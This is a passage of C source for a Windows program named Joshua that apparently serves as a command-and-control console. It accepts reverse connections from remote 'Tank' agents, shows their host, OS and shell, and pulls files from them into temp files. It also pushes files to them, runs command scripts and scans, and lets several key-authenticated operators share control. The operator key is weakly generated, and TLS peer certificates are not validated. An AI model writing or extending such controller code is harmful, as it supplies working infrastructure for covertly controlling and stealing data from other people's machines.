static void tls_load(void)
{
    g_secur32 = LoadLibrary("secur32.dll");
    if (!g_secur32) return;
#define GF(v,n) v=(void*)GetProcAddress(g_secur32,n); if(!v){FreeLibrary(g_secur32);g_secur32=NULL;return;}
    GF(p_AcqCred,    "AcquireCredentialsHandleA")
    GF(p_InitSecCtx, "InitializeSecurityContextA")
    GF(p_FreeCred,   "FreeCredentialsHandle")
    GF(p_DelSecCtx,  "DeleteSecurityContext")
    GF(p_EncMsg,     "EncryptMessage")
    GF(p_DecMsg,     "DecryptMessage")
    GF(p_FreeCtxBuf, "FreeContextBuffer")
    GF(p_QryCtxAttr, "QueryContextAttributesA")
#undef GF
    g_tls_avail = 1;
}

/* ================================================================
 * Session list panel
 * ================================================================ */
static void update_session_list(void)
{
    int i, idx;
    char title[300];
    if (!g_sess_list) return;
    SendMessage(g_sess_list, LB_RESETCONTENT, 0, 0);
    for (i = 0; i < MAX_SESSIONS; i++) {
        JoshSession *s = g_sess[i];
        if (!s) continue;
        if (s->is_console) {
            lstrcpy(title, "[Console]");
        } else if (s->is_op && s->op_authed) {
            sprintf(title, "%s [%s]",
                    s->op_handle[0] ? s->op_handle : "?",
                    s->op_is_mod ? "mod" : "op");
        } else if (s->is_tank) {
            const char *st;
            if (s->state != NS_CONNECTED) st = " [dc]";
            else if (s->cmd_busy)         st = " [busy]";
            else                          st = " [ready]";
            sprintf(title, "%s %s%s",
                    s->tank_host[0] ? s->tank_host : "?",
                    s->tank_os, st);
        } else if (s->state == NS_LISTENING) {
            sprintf(title, ":%d [listening]", s->port);
        } else {
            sprintf(title, "%s:%d", s->host[0] ? s->host : "?", s->port);
        }
        idx = (int)SendMessage(g_sess_list, LB_ADDSTRING, 0, (LPARAM)title);
        if (idx != LB_ERR)
            SendMessage(g_sess_list, LB_SETITEMDATA, (WPARAM)idx, (LPARAM)s);
    }
}

/* ================================================================
 * Session helpers
 * ================================================================ */
static JoshSession *session_by_sock(SOCKET s)
{
    int i;
    for (i = 0; i < MAX_SESSIONS; i++)
        if (g_sess[i] &&
            (g_sess[i]->sock == s || g_sess[i]->listen_sock == s))
            return g_sess[i];
    return NULL;
}

static JoshSession *session_by_dnstask(HANDLE task)
{
    int i;
    for (i = 0; i < MAX_SESSIONS; i++)
        if (g_sess[i] && g_sess[i]->dns_task == task)
            return g_sess[i];
    return NULL;
}

static void session_append(JoshSession *s, const char *text)
{
    HWND out;
    int  len;
    if (!s || !s->hwnd) return;
    out = GetDlgItem(s->hwnd, IDC_OUT);
    if (!out) return;
    len = GetWindowTextLength(out);
    SendMessage(out, EM_SETSEL, (WPARAM)len, (LPARAM)len);
    SendMessage(out, EM_REPLACESEL, 0, (LPARAM)text);
}

static void session_replace_last_line(JoshSession *s, const char *newline)
{
    HWND out;
    int  total_len, last_line_no, line_start;
    if (!s || !s->hwnd) return;
    out = GetDlgItem(s->hwnd, IDC_OUT);
    if (!out) return;
    total_len    = GetWindowTextLength(out);
    last_line_no = (int)SendMessage(out, EM_LINEFROMCHAR, (WPARAM)total_len, 0);
    line_start   = (int)SendMessage(out, EM_LINEINDEX, (WPARAM)last_line_no, 0);
    SendMessage(out, EM_SETSEL, (WPARAM)line_start, (LPARAM)total_len);
    SendMessage(out, EM_REPLACESEL, 0, (LPARAM)newline);
}

static void session_progress_bar(JoshSession *s, DWORD got, DWORD total)
{
    char  bar[24], line[128];
    int   pct    = (total > 0) ? (int)(got * 100UL / total) : 0;
    int   filled = pct / 5;
    int   i;

    bar[0] = '[';
    for (i = 0; i < 20; i++) bar[i+1] = (i < filled) ? 'o' : '-';
    bar[21] = ']'; bar[22] = '\0';
    sprintf(line, "%s %3d%%  %lu / %lu bytes\r\n", bar, pct, got, total);

    if (s->file_recv_last_pct < 0)
        session_append(s, line);
    else
        session_replace_last_line(s, line);
    s->file_recv_last_pct = pct;
}

static void session_set_title(JoshSession *s)
{
    char title[400];
    if (!s) return;
    if (s->is_console) {
        SetWindowText(s->hwnd, "Server Log / Console");
        update_session_list();
        return;
    }
    if (s->is_op) {
        if (s->op_authed)
            sprintf(title, "%s: %s [%s]",
                    s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn",
                    s->op_handle[0] ? s->op_handle : "?",
                    s->op_is_mod ? "mod" : "op");
        else if (s->state == NS_OP_AWAIT_HANDLE)
            sprintf(title, "%s [awaiting handle]",
                    s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn");
        else
            sprintf(title, "%s [auth]",
                    s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn");
        SetWindowText(s->hwnd, title);
        update_session_list();
        return;
    }
    if (s->is_tank) {
        const char *state = s->cmd_busy ? " [busy]" : " [ready]";
        if (s->state != NS_CONNECTED) state = " [disconnected]";
        sprintf(title, "Tank: %s  %s%s",
                s->tank_host[0] ? s->tank_host : "unknown",
                s->tank_os, state);
    } else {
        const char *state_str = "";
        switch (s->state) {
        case NS_RESOLVING:  state_str = " [resolving]";     break;
        case NS_CONNECTING: state_str = " [connecting]";    break;
        case NS_TLS_SHAKE:  state_str = " [TLS handshake]"; break;
        case NS_CONNECTED:  state_str = s->tls ? " [TLS]":""; break;
        case NS_LISTENING:  state_str = " [listening]";     break;
        default:            state_str = " [idle]";          break;
        }
        if (s->listen_sock != INVALID_SOCKET && s->state == NS_LISTENING)
            sprintf(title, ":%d%s", s->port, state_str);
        else
            sprintf(title, "%s:%d%s", s->host, s->port, state_str);
    }
    SetWindowText(s->hwnd, title);
    update_session_list();
}

/*
 * Parse "Tank/1 host=X os=Y.Z shell=P" banner.
 */
static int parse_tank_banner(JoshSession *s, const char *line)
{
    const char *p;
    if (strncmp(line, "Tank/1 ", 7) != 0) return 0;
    s->is_tank = 1;

    p = strstr(line, "host=");
    if (p) {
        const char *end;
        p += 5;
        end = strchr(p, ' ');
        if (!end) end = p + strlen(p);
        strncpy(s->tank_host, p, (int)(end-p) < MAX_PATH ? (int)(end-p) : MAX_PATH-1);
        s->tank_host[(int)(end-p) < MAX_PATH ? (int)(end-p) : MAX_PATH-1] = '\0';
    }
    p = strstr(line, "os=");
    if (p) {
        const char *end;
        p += 3;
        end = strchr(p, ' ');
        if (!end) end = p + strlen(p);
        strncpy(s->tank_os, p, (int)(end-p) < 63 ? (int)(end-p) : 63);
        s->tank_os[(int)(end-p) < 63 ? (int)(end-p) : 63] = '\0';
    }
    p = strstr(line, "shell=");
    if (p) {
        p += 6;
        strncpy(s->tank_shell, p, MAX_PATH-1);
        s->tank_shell[MAX_PATH-1] = '\0';
    }
    return 1;
}

/*
 * Process incoming bytes.  Handles text line accumulation, FILE: binary
 * receive, PUTREADY handshake, Tank banner, and <<<DONE>>> filtering.
 */
static void session_process_data(JoshSession *s, const char *buf, int len)
{
    int  i;
    char c;

    for (i = 0; i < len; i++) {

        /* ---- Binary file receive mode ---- */
        if (s->recv_mode == RECV_FILE) {
            DWORD written;
            if (s->file_recv_hfile != INVALID_HANDLE_VALUE)
                WriteFile(s->file_recv_hfile, buf + i, 1, &written, NULL);
            s->file_recv_got++;

            /* Update progress bar every 4 KB or on first byte */
            if ((s->file_recv_got & 0xFFF) == 0 ||
                s->file_recv_got == s->file_recv_size)
                session_progress_bar(s, s->file_recv_got, s->file_recv_size);

            if (s->file_recv_got >= s->file_recv_size) {
                char info[MAX_PATH + 64];
                if (s->file_recv_hfile != INVALID_HANDLE_VALUE) {
                    CloseHandle(s->file_recv_hfile);
                    s->file_recv_hfile = INVALID_HANDLE_VALUE;
                }
                sprintf(info, "[File saved: %s (%lu bytes)]\r\n",
                        s->file_recv_path,
                        (unsigned long)s->file_recv_size);
                session_append(s, info);
                s->recv_mode = RECV_TEXT;
            }
            continue;
        }

        /* ---- Text line accumulation mode ---- */
        c = buf[i];
        if (c == '\r') continue;
        if (s->accum_len < ACCUM_SZ - 1)
            s->accum[s->accum_len++] = c;

        if (c != '\n') continue;

        s->accum[s->accum_len] = '\0';

        /* <<<DONE>>> */
        if (strcmp(s->accum, "<<<DONE>>>\n") == 0) {
            s->cmd_busy    = 0;
            s->pager_active = 0;
            /* Scan complete: close TSV, launch Dumont                */
            if (s->scan_active) {
                char info[MAX_PATH + 64];
                if (s->scan_tsv != INVALID_HANDLE_VALUE) {
                    CloseHandle(s->scan_tsv);
                    s->scan_tsv = INVALID_HANDLE_VALUE;
                }
                s->scan_active = 0;
                sprintf(info, "[Scan complete — opening Dumont: %s]\r\n",
                        s->scan_tsv_path);
                session_append(s, info);
                spawn_dumont(s->scan_tsv_path);
            }
            /* Script running: advance to next command instead of     */
            /* showing the separator (script_advance handles its own  */
            /* separator on completion).                               */
            if (s->script_cmds) {
                session_set_title(s);
                script_advance(s);
            } else {
                session_append(s, "\xc4\xc4\xc4\xc4\xc4\xc4\xc4\xc4\xc4\xc4\r\n");
                session_set_title(s);
            }
        }
        /* <<<PAGE>>> — pager prompt */
        else if (strcmp(s->accum, "<<<PAGE>>>\n") == 0) {
            s->pager_active = 1;
            session_append(s, "  -- More --  (Enter=next page  q=quit)\r\n");
        }
        /* FILE:<size>\n — start binary receive */
        else if (strncmp(s->accum, "FILE:", 5) == 0) {
            char tmpdir[MAX_PATH];
            char tmpfile[MAX_PATH];
            DWORD fsz = (DWORD)atol(s->accum + 5);
            GetTempPath(MAX_PATH, tmpdir);
            if (tmpdir[0] == '\0') lstrcpy(tmpdir, "C:\\TEMP\\");
            sprintf(tmpfile, "%stank_%lu.bin", tmpdir,
                    (unsigned long)GetTickCount());
            strncpy(s->file_recv_path, tmpfile, MAX_PATH - 1);
            s->file_recv_path[MAX_PATH - 1] = '\0';
            s->file_recv_size      = fsz;
            s->file_recv_got       = 0;
            s->file_recv_last_pct  = -1;
            s->file_recv_hfile     = CreateFile(tmpfile, GENERIC_WRITE, 0,
                NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (s->file_recv_hfile != INVALID_HANDLE_VALUE) {
                char info[MAX_PATH + 80];
                s->recv_mode = RECV_FILE;
                sprintf(info, "[Receiving %lu bytes -> %s]\r\n",
                        (unsigned long)fsz, tmpfile);
                session_append(s, info);
            } else {
                session_append(s, "[Error: cannot create temp file]\r\n");
            }
        }
        /* PUTREADY\n — Tank ready to receive, send the file */
        else if (strcmp(s->accum, "PUTREADY\n") == 0) {
            if (s->put_pending) {
                s->put_pending = 0;
                joshua_send_put_data(s);
            }
        }
        /* Tank banner */
        else if (!s->is_tank && !s->is_op &&
                 strncmp(s->accum, "Tank/1 ", 7) == 0) {
            if (parse_tank_banner(s, s->accum)) {
                char info[512];
                sprintf(info, "[Tank connected: %s  OS %s]\r\n",
                        s->tank_host[0] ? s->tank_host : "unknown",
                        s->tank_os);
                session_append(s, info);
                session_set_title(s);
                /* Toast notification */
                { char nb[192];
                  sprintf(nb, "Host: %s\nOS:  %s",
                          s->tank_host[0] ? s->tank_host : "unknown",
                          s->tank_os);
                  show_notification("\xd7  Tank programme connected", nb);
                  sound_event(SOUND_TANK_CONNECT); }
                sprintf(info, "[TANK] %s connected  OS: %s  shell: %s\r\n",
                        s->tank_host[0] ? s->tank_host : "unknown",
                        s->tank_os, s->tank_shell);
                operator_broadcast(info);
                log_append(info);
            }
        }
        /* Operator (Lightman / Flynn) banner — key auth */
        else if (!s->is_tank && !s->is_op &&
                 (strncmp(s->accum, "Lightman/1 ", 11) == 0 ||
                  strncmp(s->accum, "Flynn/1 ",    8)  == 0)) {
            const char *kp;
            int is_light = (strncmp(s->accum, "Lightman/1 ", 11) == 0);
            s->is_op = is_light ? IS_OP_LIGHTMAN : IS_OP_FLYNN;
            kp = strstr(s->accum, "key=");
            if (kp && strncmp(kp + 4, g_server_key, 8) == 0) {
                s->state = NS_OP_AWAIT_HANDLE;
                op_send(s, "KEYOK\r\n");
                session_set_title(s);
            } else {
                op_send(s, "AUTHERR\r\n");
                session_close(s);
            }
        }
        /* Operator: handle registration */
        else if (s->is_op && !s->op_authed &&
                 s->state == NS_OP_AWAIT_HANDLE &&
                 strncmp(s->accum, "HANDLE ", 7) == 0) {
            char handle[64];
            int  hlen;
            strncpy(handle, s->accum + 7, 63);
            handle[63] = '\0';
            /* strip trailing newline */
            hlen = lstrlen(handle);
            while (hlen > 0 && (handle[hlen-1] == '\n' || handle[hlen-1] == '\r'))
                handle[--hlen] = '\0';
            if (!handle_is_unique(handle)) {
                op_send(s, "HANDLEDUP\r\n");
            } else {
                char info[192];
                int  nmods;
                strncpy(s->op_handle, handle, 63);
                s->op_handle[63] = '\0';
                s->op_authed = 1;
                s->state     = NS_CONNECTED;
                /* First authed operator becomes mod automatically */
                nmods = count_mods();
                if (nmods == 0) s->op_is_mod = 1;
                op_send(s, "HANDLEOK\r\n");
                session_set_title(s);
                /* Toast notification */
                { char nb[128];
                  sprintf(nb, "Operator: %s  (%s)",
                          s->op_handle,
                          s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn");
                  show_notification("\xa7  Operator connected", nb);
                  sound_event(SOUND_OP_JOIN); }
                /* Broadcast connect + greeting quote */
                sprintf(info, "[OP] %s connected (%s)%s\r\n",
                        s->op_handle,
                        s->is_op == IS_OP_LIGHTMAN ? "Lightman" : "Flynn",
                        s->op_is_mod ? " [mod]" : "");
                operator_broadcast(info);
                log_append(info);
                /* Per-client greeting quote to the server log */
                if (s->is_op == IS_OP_LIGHTMAN) {
                    static int lq = 0;
                    const char *quotes[3] = {
                        "Protovision, I have you now!\r\n",
                        "Greetings Professor Falken!\r\n",
                        "A strange game... ...The only winning move is not to play\r\n"
                    };
                    log_append(quotes[lq % 3]);
                    lq++;
                } else {
                    static int fq = 0;
                    const char *quotes[3] = {
                        "OK CLu, tonight we fix everything in the right hand column\r\n",
                        "Now that is a big door...\r\n",
                        "This can't be happening, it only thinks it's happening\r\n"
                    };
                    log_append(quotes[fq % 3]);
                    fq++;
                }
            }
        }
        /* Operator: active session — commands and chat */
        else if (s->is_op && s->op_authed) {
            char line[ACCUM_SZ];
            int  llen;
            strncpy(line, s->accum, ACCUM_SZ - 1);
            line[ACCUM_SZ - 1] = '\0';
            llen = lstrlen(line);
            while (llen > 0 && (line[llen-1] == '\n' || line[llen-1] == '\r'))
                line[--llen] = '\0';
            if (line[0] == '/') {
                operator_process_cmd(s, line);
            } else if (llen > 0) {
                char chat[ACCUM_SZ + 80];
                sprintf(chat, "<%s> %s\r\n", s->op_handle, line);
                operator_broadcast(chat);
                log_append(chat);
            }
        }
        /* Plain text output (from tanks) */
        else {
            /* If a scan is in flight, mirror TSV lines to the temp file */
            if (s->scan_active && s->scan_tsv != INVALID_HANDLE_VALUE) {
                DWORD written;
                WriteFile(s->scan_tsv, s->accum, (DWORD)s->accum_len, &written, NULL);
            }
            session_append(s, s->accum);
        }
        s->accum_len = 0;
    }
}

static void session_close(JoshSession *s)
{
    if (!s) return;
    if (s->is_op && s->op_authed) {
        char info[128], nb[128];
        sprintf(info, "[OP] %s disconnected\r\n", s->op_handle);
        operator_broadcast(info);
        log_append(info);
        sprintf(nb, "Operator %s disconnected", s->op_handle);
        show_notification("\xa7  Operator left", nb);
        sound_event(SOUND_OP_LEAVE);
    }
    if (s->is_tank && s->tank_host[0]) {
        char nb[128];
        sprintf(nb, "Tank from %s disconnected", s->tank_host);
        show_notification("\xd7  Tank programme lost", nb);
        sound_event(SOUND_TANK_DISCONNECT);
    }
    if (s->dns_task) { WSACancelAsyncRequest(s->dns_task); s->dns_task = NULL; }
    if (s->sock != INVALID_SOCKET) {
        WSAAsyncSelect(s->sock, g_frame, 0, 0);
        closesocket(s->sock);
        s->sock = INVALID_SOCKET;
    }
    if (s->listen_sock != INVALID_SOCKET) {
        WSAAsyncSelect(s->listen_sock, g_frame, 0, 0);
        closesocket(s->listen_sock);
        s->listen_sock = INVALID_SOCKET;
    }
    if (s->tls_ctx_valid)  { p_DelSecCtx(&s->tls_ctx);  s->tls_ctx_valid  = 0; }
    if (s->tls_cred_valid) { p_FreeCred(&s->tls_cred);  s->tls_cred_valid = 0; }
    s->tls_ibuf_len    = 0;
    s->tls_sizes_valid = 0;
    if (s->file_recv_hfile != INVALID_HANDLE_VALUE) {
        CloseHandle(s->file_recv_hfile);
        s->file_recv_hfile = INVALID_HANDLE_VALUE;
    }
    if (s->scan_tsv != INVALID_HANDLE_VALUE) {
        CloseHandle(s->scan_tsv);
        s->scan_tsv = INVALID_HANDLE_VALUE;
    }
    s->scan_active = 0;
    if (s->pkt_hwnd) {
        DestroyWindow(s->pkt_hwnd);
        s->pkt_hwnd = NULL;
    }
    s->recv_mode   = RECV_TEXT;
    script_free(s);
    if (s->macro_rec) {
        s->macro_rec = 0;
        macro_free(s);
    }
    s->put_pending = 0;
    s->state = NS_IDLE;
    session_set_title(s);
}

/* ================================================================
 * Put: send local file to Tank after PUTREADY handshake
 * ================================================================ */
static void joshua_send_put_data(JoshSession *s)
{
    HANDLE hf;
    DWORD  fsz, got, rd;
    char   hdr[64];
    char   chunk[4096];

    hf = CreateFile(s->put_local_path, GENERIC_READ, FILE_SHARE_READ,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        session_append(s, "[Put: cannot open local file]\r\n");
        return;
    }
    fsz = GetFileSize(hf, NULL);
    sprintf(hdr, "PUTSIZE:%lu\n", (unsigned long)fsz);
    if (s->tls && g_tls_avail)
        tls_encrypt_send(s, hdr, lstrlen(hdr));
    else
        send(s->sock, hdr, lstrlen(hdr), 0);

    got = 0;
    s->file_recv_last_pct = -1;  /* reuse field for upload progress */
    session_append(s, "[Uploading...]\r\n");
    while (got < fsz) {
        DWORD want = fsz - got;
        if (want > (DWORD)sizeof(chunk)) want = (DWORD)sizeof(chunk);
        if (!ReadFile(hf, chunk, want, &rd, NULL) || rd == 0) break;
        if (s->tls && g_tls_avail)
            tls_encrypt_send(s, chunk, (int)rd);
        else
            send(s->sock, chunk, (int)rd, 0);
        got += rd;
        if ((got & 0xFFF) == 0 || got == fsz)
            session_progress_bar(s, got, fsz);
    }
    CloseHandle(hf);
    {
        char info[MAX_PATH + 64];
        sprintf(info, "[Put: sent %lu bytes -> %s]\r\n",
                (unsigned long)got, s->put_local_path);
        session_append(s, info);
    }
}

/* ================================================================
 * TLS helpers (Schannel)
 * ================================================================ */
static int tls_client_begin(JoshSession *s)
{
    NC_SchannelCred cred;
    NC_TimeStamp    ts;
    ULONG           attrs;
    SecBuffer       out_buf;
    SecBufferDesc   out_desc;
    SECURITY_STATUS ss;

    memset(&cred, 0, sizeof(cred));
    cred.dwVersion             = NC_SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = NC_SP_PROT_TLS1_2_CLIENT | NC_SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags               = NC_SCH_CRED_NO_DEFAULT_CREDS |
                                 NC_SCH_CRED_MANUAL_CRED_VALIDATION;
    ss = p_AcqCred(NULL, NC_UNISP_NAME, NC_SECPKG_CRED_OUTBOUND,
                   NULL, &cred, NULL, NULL, &s->tls_cred, &ts);
    if (ss != NC_SEC_E_OK) {
        char m[64]; sprintf(m,"[TLS: AcquireCredentials failed %08lx]\r\n",(unsigned long)ss);
        session_append(s, m); return 0;
    }
    s->tls_cred_valid = 1;

    out_buf.cbBuffer = 0; out_buf.BufferType = NC_SECBUFFER_TOKEN; out_buf.pvBuffer = NULL;
    out_desc.ulVersion = NC_SECBUF_VERSION; out_desc.cBuffers = 1; out_desc.pBuffers = &out_buf;
    attrs = NC_ISC_REQ_REPLAY_DETECT | NC_ISC_REQ_SEQUENCE_DETECT |
            NC_ISC_REQ_CONFIDENTIALITY | NC_ISC_REQ_ALLOCATE_MEMORY |
            NC_ISC_REQ_STREAM | NC_ISC_REQ_MANUAL_CRED_VAL;

    ss = p_InitSecCtx(&s->tls_cred, NULL, s->host, attrs, 0, 0, NULL, 0,
                      &s->tls_ctx, &out_desc, &attrs, &ts);
    s->tls_ctx_valid = 1;
    if (out_buf.pvBuffer && out_buf.cbBuffer > 0) {
        send(s->sock, (char *)out_buf.pvBuffer, (int)out_buf.cbBuffer, 0);
        p_FreeCtxBuf(out_buf.pvBuffer);
    }
    if (ss == NC_SEC_E_OK || ss == NC_SEC_I_CONTINUE_NEEDED) {
        s->state = NS_TLS_SHAKE; session_set_title(s); return 1;
    }
    { char m[64]; sprintf(m,"[TLS init failed %08lx]\r\n",(unsigned long)ss);
      session_append(s, m); session_close(s); return 0; }
}

static void tls_handshake_feed(JoshSession *s)
{
    SecBuffer in_bufs[2], out_buf;
    SecBufferDesc in_desc, out_desc;
    NC_TimeStamp ts;
    ULONG        attrs;
    SECURITY_STATUS ss;
    int i;

    in_bufs[0].cbBuffer=(ULONG)s->tls_ibuf_len; in_bufs[0].BufferType=NC_SECBUFFER_TOKEN; in_bufs[0].pvBuffer=s->tls_ibuf;
    in_bufs[1].cbBuffer=0; in_bufs[1].BufferType=NC_SECBUFFER_EMPTY; in_bufs[1].pvBuffer=NULL;
    in_desc.ulVersion=NC_SECBUF_VERSION; in_desc.cBuffers=2; in_desc.pBuffers=in_bufs;
    out_buf.cbBuffer=0; out_buf.BufferType=NC_SECBUFFER_TOKEN; out_buf.pvBuffer=NULL;
    out_desc.ulVersion=NC_SECBUF_VERSION; out_desc.cBuffers=1; out_desc.pBuffers=&out_buf;
    attrs = NC_ISC_REQ_REPLAY_DETECT|NC_ISC_REQ_SEQUENCE_DETECT|
            NC_ISC_REQ_CONFIDENTIALITY|NC_ISC_REQ_ALLOCATE_MEMORY|
            NC_ISC_REQ_STREAM|NC_ISC_REQ_MANUAL_CRED_VAL;

    ss = p_InitSecCtx(&s->tls_cred,&s->tls_ctx,s->host,attrs,0,0,&in_desc,0,
                      &s->tls_ctx,&out_desc,&attrs,&ts);
    if (out_buf.pvBuffer && out_buf.cbBuffer>0) {
        send(s->sock,(char*)out_buf.pvBuffer,(int)out_buf.cbBuffer,0);
        p_FreeCtxBuf(out_buf.pvBuffer);
    }
    s->tls_ibuf_len = 0;
    for (i=0;i<2;i++) {
        if (in_bufs[i].BufferType==NC_SECBUFFER_EXTRA && in_bufs[i].cbBuffer>0) {
            int ex=(int)in_bufs[i].cbBuffer;
            memmove(s->tls_ibuf, s->tls_ibuf+(s->tls_ibuf_len-ex), ex);
            s->tls_ibuf_len=ex; break;
        }
    }
    if (ss==NC_SEC_E_OK) {
        p_QryCtxAttr(&s->tls_ctx,NC_SECPKG_ATTR_STREAM_SIZES,&s->tls_sizes);
        s->tls_sizes_valid=1; s->state=NS_CONNECTED;
        session_set_title(s); session_append(s,"[TLS connected]\r\n");
        if (s->tls_ibuf_len>0) tls_decrypt_recv(s,s->tls_ibuf,s->tls_ibuf_len);
    } else if (ss==NC_SEC_E_INCOMPLETE_MESSAGE) {
        s->tls_ibuf_len=(int)in_bufs[0].cbBuffer;
    } else if (ss!=NC_SEC_I_CONTINUE_NEEDED) {
        char m[64]; sprintf(m,"[TLS handshake error %08lx]\r\n",(unsigned long)ss);
        session_append(s,m); session_close(s);
    }
}

static void tls_decrypt_recv(JoshSession *s, const char *buf, int len)
{
    char plain[NC_IBUF];
    int  plain_len, i;
    char tmp[64];

    if (buf != s->tls_ibuf) {
        if (s->tls_ibuf_len+len>NC_IBUF) len=NC_IBUF-s->tls_ibuf_len;
        memcpy(s->tls_ibuf+s->tls_ibuf_len, buf, len);
        s->tls_ibuf_len += len;
    }
    while (s->tls_ibuf_len > 0) {
        SecBuffer bufs[4]; SecBufferDesc desc; ULONG qop=0; SECURITY_STATUS ss;
        bufs[0].cbBuffer=(ULONG)s->tls_ibuf_len; bufs[0].BufferType=NC_SECBUFFER_DATA; bufs[0].pvBuffer=s->tls_ibuf;
        bufs[1].cbBuffer=0;bufs[1].BufferType=NC_SECBUFFER_EMPTY;bufs[1].pvBuffer=NULL;
        bufs[2].cbBuffer=0;bufs[2].BufferType=NC_SECBUFFER_EMPTY;bufs[2].pvBuffer=NULL;
        bufs[3].cbBuffer=0;bufs[3].BufferType=NC_SECBUFFER_EMPTY;bufs[3].pvBuffer=NULL;
        desc.ulVersion=NC_SECBUF_VERSION; desc.cBuffers=4; desc.pBuffers=bufs;
        ss = p_DecMsg(&s->tls_ctx,&desc,0,&qop);
        if (ss==NC_SEC_E_INCOMPLETE_MESSAGE) break;
        if (ss!=NC_SEC_E_OK) {
            sprintf(tmp,"[TLS recv error %08lx]\r\n",(unsigned long)ss);
            session_append(s,tmp); session_close(s); return;
        }
        plain_len=0;
        for (i=0;i<4;i++) {
            if (bufs[i].BufferType==NC_SECBUFFER_DATA && bufs[i].cbBuffer>0 &&
                plain_len+(int)bufs[i].cbBuffer<NC_IBUF) {
                memcpy(plain+plain_len,bufs[i].pvBuffer,bufs[i].cbBuffer);
                plain_len+=(int)bufs[i].cbBuffer;
            }
        }
        if (plain_len>0) {
            if (s->is_tank) pkt_append(s, PKT_IN, plain, plain_len);
            session_process_data(s, plain, plain_len);
        }
        s->tls_ibuf_len=0;
        for (i=0;i<4;i++) {
            if (bufs[i].BufferType==NC_SECBUFFER_EXTRA && bufs[i].cbBuffer>0) {
                int ex=(int)bufs[i].cbBuffer;
                memmove(s->tls_ibuf,bufs[i].pvBuffer,ex);
                s->tls_ibuf_len=ex; break;
            }
        }
        if (s->tls_ibuf_len==0) break;
    }
}

static int tls_encrypt_send(JoshSession *s, const char *data, int dlen)
{
    char *buf; int total, sent;
    SecBuffer bufs[4]; SecBufferDesc desc; SECURITY_STATUS ss;
    if (!s->tls_sizes_valid) return -1;
    total=(int)(s->tls_sizes.cbHeader+(ULONG)dlen+s->tls_sizes.cbTrailer);
    buf=(char*)malloc(total); if(!buf) return -1;
    memcpy(buf+s->tls_sizes.cbHeader,data,dlen);
    bufs[0].cbBuffer=s->tls_sizes.cbHeader; bufs[0].BufferType=NC_SECBUFFER_STREAM_HEADER; bufs[0].pvBuffer=buf;
    bufs[1].cbBuffer=(ULONG)dlen;           bufs[1].BufferType=NC_SECBUFFER_DATA;          bufs[1].pvBuffer=buf+s->tls_sizes.cbHeader;
    bufs[2].cbBuffer=s->tls_sizes.cbTrailer;bufs[2].BufferType=NC_SECBUFFER_STREAM_TRAILER;bufs[2].pvBuffer=buf+s->tls_sizes.cbHeader+dlen;
    bufs[3].cbBuffer=0;                     bufs[3].BufferType=NC_SECBUFFER_EMPTY;         bufs[3].pvBuffer=NULL;
    desc.ulVersion=NC_SECBUF_VERSION; desc.cBuffers=4; desc.pBuffers=bufs;
    ss=p_EncMsg(&s->tls_ctx,0,&desc,0);
    sent=(ss==NC_SEC_E_OK)?send(s->sock,buf,total,0):-1;
    free(buf); return sent;
}

/* ================================================================
 * Server key generation
 * ================================================================ */
static void gen_server_key(void)
{
    DWORD seed = GetTickCount() ^ (DWORD)(UINT_PTR)GetModuleHandle(NULL);
    srand((unsigned int)seed);
    sprintf(g_server_key, "%04X%04X",
            (unsigned)(rand() & 0xFFFF),
            (unsigned)(rand() & 0xFFFF));
    g_server_key[8] = '\0';
}

/* ================================================================
 * Toast notifications
 * ================================================================ */

#define NOTIF_W         320
#define NOTIF_H          72
#define NOTIF_DURATION 4500   /* ms */
#define NOTIF_STACK       4   /* max simultaneous notifications */
#define WC_NOTIF       "JoshuaNotif"

/* Stacked position: each notification sits above the previous one */
static int g_notif_count = 0;

typedef struct { int active; HWND hwnd; } NotifSlot;
static NotifSlot g_notif_slots[NOTIF_STACK];

typedef struct { char title[64]; char body[192]; } NotifData;

static LRESULT CALLBACK NotifProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
    switch (msg) {
    case WM_TIMER:
        KillTimer(hwnd, 1);
        DestroyWindow(hwnd);
        return 0;

    case WM_LBUTTONDOWN:
        DestroyWindow(hwnd);
        return 0;

    case WM_PAINT: {
        PAINTSTRUCT  ps;
        HDC          dc = BeginPaint(hwnd, &ps);
        RECT         rc, tr;
        HBRUSH       bg;
        HFONT        hfb, hfn, hfo;
        NotifData   *nd = (NotifData *)GetWindowLong(hwnd, GWL_USERDATA);

        GetClientRect(hwnd, &rc);

        /* Theme background */
        bg = CreateSolidBrush(g_themes[g_theme_idx].bg);
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        /* Theme accent strip */
        { RECT strip;
          HBRUSH sb;
          SetRect(&strip, 0, 0, rc.right, 3);
          sb = CreateSolidBrush(g_themes[g_theme_idx].strip);
          FillRect(dc, &strip, sb);
          DeleteObject(sb); }

        SetBkMode(dc, TRANSPARENT);

        /* Title line */
        hfb = make_font("Arial", 9, 1, 0);
        hfo = (HFONT)SelectObject(dc, hfb);
        SetTextColor(dc, g_themes[g_theme_idx].title);
        tr.left = 10; tr.top = 7; tr.right = rc.right - 6; tr.bottom = 26;
        if (nd) DrawText(dc, nd->title, -1, &tr, DT_LEFT | DT_NOPREFIX | DT_SINGLELINE);
        SelectObject(dc, hfo);
        DeleteObject(hfb);

        /* Body line */
        hfn = make_font("Arial", 8, 0, 0);
        SelectObject(dc, hfn);
        SetTextColor(dc, g_themes[g_theme_idx].body);
        tr.top = 28; tr.bottom = rc.bottom - 6;
        if (nd) DrawText(dc, nd->body, -1, &tr, DT_LEFT | DT_NOPREFIX | DT_WORDBREAK);
        SelectObject(dc, GetStockObject(DEFAULT_GUI_FONT));
        DeleteObject(hfn);

        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_DESTROY: {
        int i;
        NotifData *nd = (NotifData *)GetWindowLong(hwnd, GWL_USERDATA);
        if (nd) { GlobalFree((HGLOBAL)nd); }
        for (i = 0; i < NOTIF_STACK; i++) {
            if (g_notif_slots[i].hwnd == hwnd) {
                g_notif_slots[i].active = 0;
                g_notif_slots[i].hwnd   = NULL;
                g_notif_count--;
                if (g_notif_count < 0) g_notif_count = 0;
                break;
            }
